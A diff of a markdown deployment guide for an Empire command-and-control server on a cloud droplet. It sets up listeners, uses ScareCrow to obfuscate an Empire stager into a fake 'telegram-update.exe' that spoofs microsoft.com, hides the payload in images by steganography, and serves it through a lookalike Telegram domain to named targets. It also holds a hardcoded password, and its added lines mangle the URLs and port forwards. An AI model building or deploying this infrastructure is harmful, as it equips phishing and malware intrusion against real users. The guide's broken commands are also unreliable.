@@ -1,18 +1,18 @@
 # Empire C2 Framework - Digital Ocean Deployment Guide
 
-## 🎯 Current Status
+## Current Status
 
-- ✅ Empire installed locally (powershell-empire)
-- ✅ Starkiller configured
-- ✅ Digital Ocean droplet: `161.35.155.3`
-- ✅ Domain configured: `161-35-155-3.sslip.io`
-- ✅ nginx proxy ready on droplet
-- ✅ SSH access: `ssh -p 22 root@161.35.155.3`
+- Empire installed locally (powershell-empire)
+- Starkiller configured
+- Digital Ocean droplet: `161.35.155.3`
+- Domain configured: `161-35-155-3.sslip.io`
+- nginx proxy ready on droplet
+- SSH access: `ssh -p 22 root@161.35.155.3`
 - ⏳ Empire dependencies need to be resolved
 - ⏳ Listeners need to be configured
 - ⏳ Stagers need to be generated
 
-## 🚀 Deployment Steps
+## Deployment Steps
 
 ### Step 1: Fix Empire Installation
 
@@ -24,7 +24,7 @@ sudo apt remove powershell-empire
 
 # Install from source
 cd /opt
-sudo git clone --recursive https://github.com/BC-SECURITY/Empire.git
+sudo git clone --recursive https/github.com/BC-SECURITY/Empire.git
 cd Empire
 sudo ./setup/install.sh
 
@@ -42,45 +42,45 @@ ssh root@161.35.155.3
 # Create nginx config for Empire
 cat > /etc/nginx/sites-available/empire << 'EOF'
 server {
-    listen 443 ssl http2;
-    server_name 161-35-155-3.sslip.io;
-    
-    ssl_certificate /etc/letsencrypt/live/161-35-155-3.sslip.io/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/161-35-155-3.sslip.io/privkey.pem;
-    
-    # Starkiller UI
-    location / {
-        proxy_pass http://127.0.0.1:3000;
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection 'upgrade';
-        proxy_set_header Host $host;
-        proxy_cache_bypass $http_upgrade;
-    }
-    
-    # Empire API
-    location /api {
-        proxy_pass http://127.0.0.1:1337;
-        proxy_http_version 1.1;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header Host $host;
-    }
-    
-    # WebSocket support
-    location /socket.io {
-        proxy_pass http://127.0.0.1:1337;
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection "upgrade";
-    }
+ listen 443 ssl http2;
+ server_name 161-35-155-3.sslip.io;
+
+ ssl_certificate /etc/letsencrypt/live/161-35-155-3.sslip.io/fullchain.pem;
+ ssl_certificate_key /etc/letsencrypt/live/161-35-155-3.sslip.io/privkey.pem;
+
+ # Starkiller UI
+ location / {
+ proxy_pass http/127.0.0.1:3000;
+ proxy_http_version 1.1;
+ proxy_set_header Upgrade $http_upgrade;
+ proxy_set_header Connection 'upgrade';
+ proxy_set_header Host $host;
+ proxy_cache_bypass $http_upgrade;
+ }
+
+ # Empire API
+ location /api {
+ proxy_pass http/127.0.0.1:1337;
+ proxy_http_version 1.1;
+ proxy_set_header X-Real-IP $remote_addr;
+ proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+ proxy_set_header Host $host;
+ }
+
+ # WebSocket support
+ location /socket.io {
+ proxy_pass http/127.0.0.1:1337;
+ proxy_http_version 1.1;
+ proxy_set_header Upgrade $http_upgrade;
+ proxy_set_header Connection "upgrade";
+ }
 }
 
 # HTTP redirect to HTTPS
 server {
-    listen 80;
-    server_name 161-35-155-3.sslip.io;
-    return 301 https://$server_name$request_uri;
+ listen 80;
+ server_name 161-35-155-3.sslip.io;
+ return 301 https/$server_name$request_uri;
 }
 EOF
 
@@ -96,10 +96,10 @@ For local development before full deployment:
 
 ```bash
 # Forward Empire API from local machine to droplet
-ssh -R 1337:localhost:1337 root@161.35.155.3
+ssh -R 13371337 root@161.35.155.3
 
 # Forward Starkiller from local machine to droplet
-ssh -R 3000:localhost:3000 root@161.35.155.3
+ssh -R 30003000 root@161.35.155.3
 ```
 
 ### Step 4: Configure Empire Listeners
@@ -110,7 +110,7 @@ Once Empire is running, create listeners:
 ```python
 # Via Empire CLI
 uselistener http
-set Host https://161-35-155-3.sslip.io
+set Host https/161-35-155-3.sslip.io
 set Port 443
 set BindIP 127.0.0.1
 set DefaultProfile /admin/get.php,/news.php,/login/process.php|Mozilla/5.0
@@ -120,7 +120,7 @@ execute
 #### HTTPS Listener (Direct)
 ```python
 uselistener https
-set Host https://161-35-155-3.sslip.io
+set Host https/161-35-155-3.sslip.io
 set Port 8443
 set CertPath /etc/letsencrypt/live/161-35-155-3.sslip.io/fullchain.pem
 execute
@@ -160,10 +160,10 @@ cd /home/kali/ScareCrow
 
 # Generate obfuscated payload with Empire stager
 ./ScareCrow \\
-  -I /home/kali/Main\ C2\ Framework/stagers/empire.dll \\
-  -Loader binary \\
-  -domain microsoft.com \\
-  -O /home/kali/Main\ C2\ Framework/payloads/telegram-update.exe
+ -I /home/kali/Main\ C2\ Framework/stagers/empire.dll \\
+ -Loader binary \\
+ -domain microsoft.com \\
+ -O /home/kali/Main\ C2\ Framework/payloads/telegram-update.exe
 ```
 
 ### Step 7: Update Steganography System
@@ -175,8 +175,8 @@ cd /home/kali/Main\ C2\ Framework/advanced-steganography-phishing
 
 # Embed ScareCrow payload in images
 python3 large-stego-system.py embed \\
-  --payload /home/kali/Main\ C2\ Framework/payloads/telegram-update.exe \\
-  --output-dir ./output
+ --payload /home/kali/Main\ C2\ Framework/payloads/telegram-update.exe \\
+ --output-dir ./output
 ```
 
 ### Step 8: Deploy Cloudflare Workers
@@ -187,15 +187,15 @@ cd workers
 wrangler publish enhanced-telegram-delivery.js
 
 # Test worker
-curl -X POST https://delivery.telegrams.app/api/deliver \\
-  -H "Content-Type: application/json" \\
-  -d '{"target_id": "test_user"}'
+curl -X POST https/delivery.telegrams.app/api/deliver \\
+ -H "Content-Type: application/json" \\
+ -d '{"target_id": "test_user"}'
 ```
 
-## 📊 Verification Checklist
+## Verification Checklist
 
 - [ ] Empire server running on local machine
-- [ ] Empire API responding at `http://127.0.0.1:1337`
+- [ ] Empire API responding at `http/127.0.0.1:1337`
 - [ ] Starkiller UI accessible
 - [ ] nginx proxy configured on droplet
 - [ ] SSL certificates valid
@@ -208,7 +208,7 @@ curl -X POST https://delivery.telegrams.app/api/deliver \\
 - [ ] Steganography system updated
 - [ ] End-to-end payload delivery tested
 
-## 🔧 Troubleshooting
+## Troubleshooting
 
 ### Empire Won't Start
 ```bash
@@ -237,10 +237,10 @@ systemctl restart nginx
 ### Listener Not Working
 - Verify firewall rules: `ufw status`
 - Check Empire listener status
-- Test direct connection: `curl https://161-35-155-3.sslip.io`
+- Test direct connection: `curl https/161-35-155-3.sslip.io`
 - Verify DNS resolution: `dig 161-35-155-3.sslip.io`
 
-## 🎓 Next Steps
+## Next Steps
 
 1. **Testing**: Deploy test stagers in controlled VM
 2. **OPSEC**: Configure IP filtering and rate limiting
@@ -248,7 +248,7 @@ systemctl restart nginx
 4. **Backup**: Create config backups
 5. **Documentation**: Record all configurations
 
-## 📱 Quick Commands Reference
+## Quick Commands Reference
 
 ```bash
 # Start Empire locally
@@ -258,21 +258,21 @@ powershell-empire server --config empire-config.yaml
 ssh root@161.35.155.3
 
 # Check Empire status
-curl http://127.0.0.1:1337/api/v2/meta/version
+curl http/127.0.0.1:1337/api/v2/meta/version
 
 # List listeners
 curl -u empireadmin:EmpireC2Pass2024! \\
-  http://127.0.0.1:1337/api/v2/listeners
+ http/127.0.0.1:1337/api/v2/listeners
 
 # List agents
 curl -u empireadmin:EmpireC2Pass2024! \\
-  http://127.0.0.1:1337/api/v2/agents
+ http/127.0.0.1:1337/api/v2/agents
 
 # Reload nginx
 ssh root@161.35.155.3 "systemctl reload nginx"
 ```
 
-## 🔐 Security Considerations
+## Security Considerations
 
 - Change default Empire passwords immediately
 - Use SSH keys instead of passwords for droplet access
@@ -287,4 +287,4 @@ ssh root@161.35.155.3 "systemctl reload nginx"
 **Status**: Ready for deployment once Empire dependencies are resolved
 **Last Updated**: $(date)
 **Project**: Advanced Steganography C2 Framework
-**Research Context**: PhD Criminology - Copenhagen University
+**Research Context**: Criminology - Copenhagen University
